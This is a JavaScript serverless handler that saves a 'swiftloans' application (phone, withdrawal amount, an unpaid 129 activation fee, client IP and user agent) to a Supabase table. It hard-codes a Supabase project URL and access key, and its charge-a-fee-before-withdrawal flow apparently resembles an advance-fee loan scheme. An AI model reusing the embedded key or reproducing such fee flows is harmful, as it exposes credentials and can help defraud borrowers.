import { createClient } from '@supabase/supabase-js';

const supabaseUrl = 'https://dbpbvoqfexofyxcexmmp.supabase.co';
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRicGJ2b3FmZXhvZnl4Y2V4bW1wIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTkzNDc0NTMsImV4cCI6MjA3NDkyMzQ1M30.hGn7ux2xnRxseYCjiZfCLchgOEwIlIAUkdS6h7byZqc';

const supabase = createClient(supabaseUrl, supabaseKey);

export default async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');

  if (req.method === 'OPTIONS') {
    return res.status(200).send('');
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, message: 'Method not allowed' });
  }

  try {
    const { 
      phone,
      amount,
      withdrawalAmount,
      paymentReference
    } = req.body;

    // Validate required fields
    if (!phone) {
      return res.status(400).json({ 
        success: false, 
        message: 'Missing required field: phone' 
      });
    }

    // Prepare project-specific data with 129 activation fee
    const projectData = {
      withdrawalAmount: withdrawalAmount || amount || 0,
      activationFee: 129,
      submittedAt: new Date().toISOString()
    };

    // Get client IP and user agent
    const ipAddress = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.socket?.remoteAddress || '';
    const userAgent = req.headers['user-agent'] || '';

    // Insert into applications table
    const { data, error } = await supabase
      .from('applications')
      .insert({
        project_name: 'swiftloans',
        full_name: 'Swift Loans User',
        email: 'user@swiftloans.com',
        phone: phone,
        project_data: projectData,
        payment_reference: paymentReference || null,
        payment_status: 'unpaid',
        payment_amount: 129,
        ip_address: typeof ipAddress === 'string' ? ipAddress.split(',')[0].trim() : '',
        user_agent: userAgent
      })
      .select()
      .single();

    if (error) {
      console.error('Database insert error:', error);
      return res.status(500).json({ 
        success: false, 
        message: 'Failed to save application',
        error: error.message 
      });
    }

    console.log('Application saved successfully:', data.id);

    return res.status(200).json({
      success: true,
      message: 'Application submitted successfully',
      data: {
        applicationId: data.id,
        reference: data.payment_reference
      }
    });

  } catch (error) {
    console.error('Submit application error:', error);
    return res.status(500).json({
      success: false,
      message: 'Internal server error',
      error: error.message
    });
  }
};
